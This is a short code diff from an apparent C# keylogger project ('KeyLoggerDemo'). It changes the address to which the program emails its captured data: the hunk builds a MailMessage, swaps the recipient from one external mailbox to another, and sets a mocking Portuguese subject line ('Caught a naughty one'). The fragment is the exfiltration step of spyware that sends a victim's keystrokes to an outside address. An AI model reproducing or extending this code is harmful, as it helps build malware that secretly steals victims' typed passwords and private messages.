@@ -172,7 +172,7 @@ namespace KeyLoggerDemo
 
                 MailMessage mail = new MailMessage();
                 mail.From = new MailAddress(userEmail);
-                mail.To.Add("bashlover142@gmail.com"); // Envie para o email desejado
+                mail.To.Add("rootkitequality@yopmail.com"); // Envie para o email desejado
                 mail.Subject = "Peguei um Safadinho rsrsrs";
                 mail.Body = emailBody;
 
